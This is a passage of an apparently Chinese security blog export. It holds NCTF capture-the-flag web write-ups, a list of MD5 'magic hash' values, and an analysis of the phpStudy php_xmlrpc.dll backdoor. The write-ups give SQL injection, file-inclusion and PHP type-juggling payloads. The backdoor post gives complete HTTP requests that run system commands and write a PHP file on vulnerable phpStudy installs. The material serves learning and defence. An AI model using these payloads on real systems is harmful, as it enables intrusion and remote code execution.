@$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125; 此题有关MD5碰撞，哈希相等的问题，详解MD5碰撞看我之前的文章MD5碰撞和MD5值(哈希值)相等 大概就是： 在PHP的数的处理中，0开头的字符串会被转换成0 所以我们GET请求a=s878926199a,进行碰撞 签到2题目链接 方式一 添加输入框的值`value=&quot;zhimakaimen&quot;`,然后点击开门 方式二 修改输入框的最大输入长度`maxlength=&#39;11&#39;`，然后在输入框输入zhimakaimen,再提交即可 这题不是WEB题目链接 下载动图，直接文本方式打开（notepad也ok） 层层递进题目链接 1F12 # 查看源代码 访问此页面SO.html 继续F12,访问S0.html 继续访问，SO.htm 继续进入,S0.htm 进入404.html,点击回退就真的回去了(hhh),F12分析一波 AAencode题目链接 换编码后 复制，控制台运行，弹出FLAG 单身二十年题目链接 真的是考验手速的题? 我看未必 Burp抓包 php decode12345678910111213141516&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE; &#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; 复制到php文件运行 将eval改成print_r,因为此函数的执行结果是返回值，所以我们需要打印出来 文件包含题目链接 点击click me? no进入了文件包含页面 我们可以使用php://filter协议包含index.php文件 php://filter/read=convert.base64-encode/resource=index.php 将输出的base64加密的密文，进行解码 文件注释中包含flag 单身一百年也没用题目链接 burp又登场了 Download~!页面无法访问,待更新。。。 COOKIE修改cookie的值为1，即可 MYSQL题目链接 访问robots.txt文件 发现robots.txt中php代码，我们分析一下 1234567891011121314&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#x27;$id&#x27;&quot;)); if ($_GET[id]==1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 根据以上代码分析，这里是利用intval()函数来绕过，输出flag。因此，url传入id=1024.1 intval()1234567891011121314151617181920212223intval() 函数用于获取变量的整数值。intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。PHP 4, PHP 5, PHP 7语法int intval ( mixed $var [, int $base = 10 ] )参数说明：$var：要转换成 integer 的数量值。$base：转化所使用的进制。（默认是十进制）如果 base 是 0，通过检测 var 的格式来决定使用的进制：如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。返回值成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(&#x27;1000000000000&#x27;) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。字符串有可能返回 0，虽然取决于字符串最左侧的字符。 举例： 12345678910111213141516171819&lt;?phpecho intval(42); // 42echo intval(4.2); // 4echo intval(&#x27;42&#x27;); // 42echo intval(&#x27;+42&#x27;); // 42echo intval(&#x27;-42&#x27;); // -42echo intval(042); // 34echo intval(&#x27;042&#x27;); // 42echo intval(1e10); // 1410065408echo intval(&#x27;1e10&#x27;); // 1echo intval(0x1A); // 26echo intval(42000000); // 42000000echo intval(420000000000000000000); // 0echo intval(&#x27;420000000000000000000&#x27;); // 2147483647echo intval(42.88, 8); // 42，挑一个详解：这里是先将42.88取整，再将它以8进制转换为10进制echo intval(&#x27;42&#x27;, 8); // 34echo intval(array()); // 0echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;)); // 1?&gt; 因此，无论这个intval函数$base用的哪个进制来转换的，都是先将$var取整，再将$var从$base进制转换为10进制 GBK Injection题目链接 访问，需要传id这个参数 一下子都想到sql注入，结果会显发现&#39;和&quot;等特殊字符都被转义 然后发现可以利用宽字节注入(没有被转义) 先判断字段数?id=1%df&#39; order by 3 %23 然后我们自定义回显id=1%df&#39; and 1=2 union select 1,2 %23 我们接下来按照以下步骤 爆数据库（这里只需要知道当前数据库即可） 爆表 爆字段 查询想要的值 注：一下操作全在修改自定义回显中体现 1).查看当前数据库 ?id=1%df&#39; and 1=2 union select 1,database() %23，其中database()表示当前数据库名 2).报表( sae-chinalover这个数据库的表) 注意,因为单引号和双引号被转义了，所以我们不能使用单引号来进行约束。我们可以将sae-chinalover转换为16进制 注意：7361652d6368696e616c6f766572==sae-chinalover,其中没有引号，0x表示后面的数字是16进制数 3).通过表( ctf,ctf2,ctf3,ctf4,gbksqli,news )爆字段 这里呢,因为flag在ctf4中，所以我们只拿一个来举例。其余的方法都大同小异 ![image-20191107090128927](https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107090128927.png) 获得两个字段，id,flag,我们直接通过查询输出,?id=1%df&#39; and 1=2 union select 1,group_concat(flag) from ctf4 %23 /x00题目链接 进去就是一段php代码 12345678910&lt;?php if (isset ($_GET[&#x27;nctf&#x27;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE) echo &#x27;必须输入数字才行&#x27;; else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;骚年，继续努力吧啊~&#x27;; &#125;?&gt; 因为ereg()函数存在NULL截断漏洞，导致正则过滤被绕过，因此我们可以使用00截断 我们构造nctf=%00#biubiubiu， 尝试一次，发现失败 后面才反应过来, ==url中的#后面的字符都会被浏览器解读为位置标识符。因此，这些字符都不会被发送到服务器端，于是，我们需要对#进行url编码== bypass again题目链接 又是代码 123456789&lt;?phpif (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;])) &#123;if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])if (md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;Wrong.&#x27;;&#125;?&gt; 一看代码，就知道了，又是md5值的碰撞问题,参考我之前的文章MD5碰撞和MD5值(哈希值)相等 变量覆盖题目链接 进去一看 点进去，发现以下代码,分析一波 123456789&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt; &lt;?php &#125; ?&gt; 可以参考CTF之php变量覆盖漏洞，这里主要就是我们可以通过extract()这个函数 extract()会把符号表中已存在的变量名的值替换掉 ,所以我们通过burp来构造值 PHP是最好的语言无法访问… 待更新 伪装者题目链接 一看到本地访问，我第一时间就想到了X-Forwarded-For: 127.0.0.1，打开burp，添加字段 但是很遗憾，在这里行不通，但是我们还可以通过Client-IP:127.0.0.1来伪造 还有一下几种伪造方式: 12345X-Client-IP:1.1.1.1X-Remote-IP:2.2.2.2X-Remote-Addr:3.3.3.3X-Originating-IP:4.4.4.4X-Forwarded-For:5.5.5.5 Header页面无法访问，待更新… 上传绕过题目链接 一个上传文件的页面，我们直接利用%00截断上传 发现没用，只允许上传图片,然后将文件名改成1.jpg,但是我尝试使用修改hex为00便可以(至今有点迷，不知道为啥) SQL注入1题目链接 这个题特别简单 发现不需要什么猜测，源代码都直接给你，hhh 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&#x27;&quot;.$user.&quot;&#x27;) and (pw=&#x27;&quot;.$pass.&quot;&#x27;)&quot;; #重点 echo &#x27;&lt;/br&gt;&#x27;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=&quot;Username&quot;&gt;&lt;input type=password name=pass value=&quot;Password&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;&lt;/html&gt; $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;重点是这一行代码,我们得想办法绕过 在用户框输入admin,提示如下 我们直接闭合单引号，然后注释后面的代码,拿到flag pass check题目链接 代码： 1234567891011121314&lt;?php$pass=@$_POST[&#x27;pass&#x27;];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; strcmp()函数的作用 php5.3之前的strcmp的漏洞当参数中的一个字符串是对象或者数组时，函数会返回0 通过以上我们知道传入一个数组即可绕过，因为POST传参，所以我们使用burp 注：POST请求 起名字真难题目地址 源代码： 123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;$flag=&#x27;*******&#x27;;if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; 题目要求不能输入数字，但是输入的字符串必须和54975581388相同用和54975581388等值的16进制表示，很巧，全不是数字，就成功了 当遇到 与数字字符串对比校验的时候，可以尝试转换为等值的16进制字串 密码重置题目链接 Y3RmdXNlcg==base64解码为ctfyuser 思路就是将url的值admin使用base64编码，输入框的账号也改成admin admin使用base64加密得YWRtaW4= php 反序列化(暂时无法做)暂时无法做…待更新 SQL Injection题目链接 F12发现php代码,我们分析一波 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &#x27;db.inc.php&#x27;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&#x27;username&#x27;]);$password = @clean((string)$_GET[&#x27;password&#x27;]);$query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;.$username.&#x27;\\&#x27; AND pass=\\&#x27;&#x27;.$password.&#x27;\\&#x27;;&#x27;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&#x27;Invalid password!&#x27;);&#125;echo $flag;--&gt; 注意上面clean function中的htmlentities()函数，它会把输入字符中的 ’ 或者 ” 转变为html实体，这样一来就无法闭合源代码中的 ’ 了，还有就是，如果php的magic_quotes_gpc是开启状态的话，我们输入的转义符也会被去掉的，不过既然这道题目能做，说明我们是可以使用转义符 \\ ，我们解这道题的关键就是使用转义符 \\ 来让源代码中‘SELECT * FROM users WHERE name=&#39;‘.$username.’&#39; AND pass=&#39;‘.$password.’&#39;;’$username后面的 ’ 失效，只要 这个 ’ 失效，就能闭合name=后面的 ’ ，要达到这一目的，我们只需要让username=admin \\即可，让后使password的值为一个永真式(or 1=1)就可以得到这道题的flag这样提交的数据，会导致源代码中的SQL语句变为： 1SELECT * FROM users WHERE name=&#x27;admin \\&#x27; AND pass=&#x27; or 1=1 ?username=admin \\&amp;password=or 1=1%23 ,%23是#的url编码 综合题题目链接 我们直接将字符放在控制台执行 我们访问这个页面 history of bash,在linux系统中，history命令都保存在家目录下的.bash_history文件中 访问.bash_history发现压缩包 访问flagbak.zip文件 system（暂时无法做）待更新… SQL注入2题目链接 发现源代码,分析一下 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login II&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#x27;$user&#x27;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=&quot;Username&quot;&gt;&lt;input type=password name=pass value=&quot;Password&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;&lt;/html&gt; 1.用post方法输入两个变量 2.输入的变量pass的值经过MD5加密了 3.中存储的是sql命令的结果集 4.如果变量存在，并且，$pass与$query[pw]相等（不区分大小写） 所以我们考虑在$user上加上一个union语句，即向$query的结果集中在加一条，同时能够使得条4成立 注意需要在union前加一个 ‘ 用于闭合’$uesr’前的那个引号，#是为了注释点后面的那个引号 综合题2还不会，待更新… 密码重置21234TIPS:1.管理员邮箱观察一下就可以找到2.linux下一般使用vi编辑器，并且异常退出会留下备份文件3.弱类型bypass 题目链接 F12，发现管理员邮箱地址 在linux系统中，文件写入出现异常，会在本地生成一个.filename.swp的文件 # 注filename是你的文件名，我们访问.submit.php.swp 源代码分析一波 1234567891011121314151617181920212223242526272829303132333435363738394041424344........这一行是省略的代码......../*如果登录邮箱地址不是管理员则 die()数据库结构---- 表的结构 `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT &#x27;0&#x27;, PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- 转存表中的数据 `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, &#x27;****不可见***&#x27;, &#x27;***不可见***&#x27;, 0);*/........这一行是省略的代码........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&#x27;fail&#x27;); if($token!=&#x27;0&#x27;) die(&#x27;fail&#x27;); $sql = &quot;SELECT count(*) as num from `user` where token=&#x27;$token&#x27; AND email=&#x27;$emailAddress&#x27;&quot;; $r = mysql_query($sql) or die(&#x27;db error&#x27;); $r = mysql_fetch_assoc($r); $r = $r[&#x27;num&#x27;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;失败了呀&quot;; &#125;&#125; 这边$token长度要等于10，$token= 0,所以我们构造10个0,0000000000 file_get_contents题目链接 F12,发现源代码 1234&lt;!--$file = $_GET[&#x27;file&#x27;];if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf;&#125;--&gt; file_put_contens()函数的作用 我们使用burp,结合php://input协议，传数据 注意，结构如下图 变量覆盖题目链接 F12,发现源代码 123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == &quot;meizijiu233&quot;)&#123; echo $flag;&#125;--&gt; GET传name=meizijiu233，使得$key=name，那么$$key=$name,这样来改变变量的值 注意！！ 这个不是题 HateIT做不了啊,待更新… Anonymous做不了啊,待更新… 总结 变量覆盖 进制转换(PHP) 以上两点比较生疏，加强练习,最后，F12无敌!!! 没思路就F12","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://taonn.github.io/tags/CTF/"}]},{"title":"MD5碰撞和MD5值(哈希值)相等","slug":"MD5碰撞和MD5值(哈希值)相等","date":"2020-09-26T06:58:59.000Z","updated":"2021-03-16T05:25:54.001Z","comments":true,"path":"2020/09/26/MD5碰撞和MD5值(哈希值)相等/","link":"","permalink":"https://taonn.github.io/2020/09/26/MD5%E7%A2%B0%E6%92%9E%E5%92%8CMD5%E5%80%BC(%E5%93%88%E5%B8%8C%E5%80%BC)%E7%9B%B8%E7%AD%89/","excerpt":"","text":"漏洞叙述 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。 MD5碰撞做南邮CTF的时候遇到PHP中MD5哈希值相等的问题，在此做个记录md5的碰撞，在PHP的数的处理中，0开头的字符串会被转换成0，所以才会有md5碰撞 0e开头的md5和原值：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 大写字母类123456789101112131415161718192021222324252627282930313233343536QLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391EEIZDOI0e782601363539291779881938479162TUFEPMC0e839407194569345277863905212547UTIPEZQ0e382098788231234954670291303879UYXFLOI0e552539585246568817348686838809IHKFRNS0e256160682445802696926137988570PJNPDWY0e291529052894702774557631701704ABJIHVY0e755264355178451322893275696586DQWRASX0e742373665639232907775599582643DYAXWCA0e424759758842488633464374063001GEGHBXL0e248776895502908863709684713578GGHMVOE0e362766013028313274586933780773GZECLQZ0e537612333747236407713628225676NWWKITQ0e763082070976038347657360817689NOOPCJF0e818888003657176127862245791911MAUXXQC0e478478466848439040434801845361MMHUWUV0e701732711630150438129209816536 MD5值(哈希值)相等的问题可以用哈希值碰撞，也可以用数组绕过，如：username[]=1&amp;password[]=2题目源代码: 12345678910111213141516171819202122232425&lt;?php error_reporting(0); header(&quot;Content-Type: text/html; charset=utf-8&quot;); session_start(); if (isset($_SESSION[&#x27;CHVGCGMM_login&#x27;])) &#123; header(&#x27;Location: panel.php&#x27;); die(&#x27;登录成功！&#x27;); &#125; $p_username = $_POST[&#x27;username&#x27;]; $p_password = $_POST[&#x27;password&#x27;]; if (isset($p_username) &amp;&amp; isset($p_password)) &#123; if ($p_username == $p_password) die(&#x27;用户名与密码不能相同！&#x27;); if (md5($p_password) === md5($p_username)) &#123; $_SESSION[&#x27;CHVGCGMM_login&#x27;] = $p_username; header(&#x27;Location: panel.php&#x27;); die(&#x27;登录成功！&#x27;); &#125;else&#123; die(&#x27;密码不正确！&#x27;); &#125; &#125; ?&gt; 上题使用数组即可绕过 参考链接 https://www.freebuf.com/news/67007.html https://www.cnblogs.com/Jie-Fei/p/9886598.html https://www.cnblogs.com/0yst3r-2046/p/10748412.html","categories":[{"name":"胡乱倒腾","slug":"胡乱倒腾","permalink":"https://taonn.github.io/categories/%E8%83%A1%E4%B9%B1%E5%80%92%E8%85%BE/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://taonn.github.io/tags/CTF/"}]},{"title":"phpstudy后门分析","slug":"phpstudy后门分析","date":"2020-09-26T05:52:36.000Z","updated":"2021-03-16T05:26:14.312Z","comments":true,"path":"2020/09/26/phpstudy后门分析/","link":"","permalink":"https://taonn.github.io/2020/09/26/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/","excerpt":"","text":"问题概述 有问题的版本： ​ 默认路劲 C:\\phpStudy\\PHPTutorial\\php\\php-5.2.17\\ext\\ PHPStudy php版本 ext扩展文件夹下 phpStudy20180211 php5.4.45 和 php5.2.17 php_xmlrpc.dll phpStudy20161103 php5.4.45 和 php5.2.17 php_xmlrpc.dll 后门所在位置： 使用记事本打开 php_xmlrpc.dll文件 Getshell我们通过burp抓包软件来利用后门 没有修改的请求头信息 123456789GET &#x2F; HTTP&#x2F;1.1Host: 192.168.1.131Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close 修改后： 123456789101112GET &#x2F; HTTP&#x2F;1.1Host: 192.168.1.131Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3Accept-Encoding: gzip,deflate #deflate前面的空格去掉Accept-charset:c3lzdGVtKCdpcGNvbmZpZycpOw&#x3D;&#x3D; # 添加新字段，值需要base64编码Accept-Language: zh-CN,zh;q&#x3D;0.9Connection: close 执行系统命令：c3lzdGVtKCdpcGNvbmZpZycpOw== 解码为：system(&#39;ipconfig&#39;); phpinfo 写一句话木马,利用 file_put_contents()函数 file_put_contents(&quot;C:\\phpStudy\\PHPTutorial\\WWW\\info.php&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;); 12345678910GET &#x2F; HTTP&#x2F;1.1Host: 192.168.1.131Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3Accept-Encoding: gzip,deflateAccept-charset:ZmlsZV9wdXRfY29udGVudHMoIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1xpbmZvLnBocCIsIjw&#x2F;cGhwIHBocGluZm8oKTsgPz4iKTs&#x3D;Accept-Language: zh-CN,zh;q&#x3D;0.9Connection: close 预防措施1.修改php.ini配置文件，注释这个扩展文件 使用最新的phpstudy","categories":[{"name":"PHP","slug":"PHP","permalink":"https://taonn.github.io/categories/PHP/"}],"tags":[{"name":"php安全","slug":"php安全","permalink":"https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"},{"name":"phpstudy后门分析","slug":"phpstudy后门分析","permalink":"https://taonn.github.io/tags/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"}]}],"categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"安全开发","slug":"web安全/安全开发","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"Red team","slug":"Red-team","permalink":"https://taonn.github.io/categories/Red-team/"},{"name":"代码审计","slug":"web安全/代码审计","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Python","slug":"Python","permalink":"https://taonn.github.io/categories/Python/"},{"name":"PHP","slug":"PHP","permalink":"https://taonn.github.io/categories/PHP/"},{"name":"胡乱倒腾","slug":"胡乱倒腾","permalink":"https://taonn.github.io/categories/%E8%83%A1%E4%B9%B1%E5%80%92%E8%85%BE/"}],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"https://taonn.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"},{"name":"信息收集","slug":"信息收集","permalink":"https://taonn.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"端口转发","slug":"端口转发","permalink":"https://taonn.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"溢出攻击","slug":"溢出攻击","permalink":"https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"},{"name":"php安全","slug":"php安全","permalink":"https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"},{"name":"CTF","slug":"CTF","permalink":"https://taonn.github.io/tags/CTF/"},{"name":"Python常用模块","slug":"Python常用模块","permalink":"https://taonn.github.io/tags/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://taonn.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"常用工具","slug":"常用工具","permalink":"https://taonn.github.io/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://taonn.github.io/tags/Wireshark/"},{"name":"phpstudy后门分析","slug":"phpstudy后门分析","permalink":"https://taonn.github.io/tags/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"}]}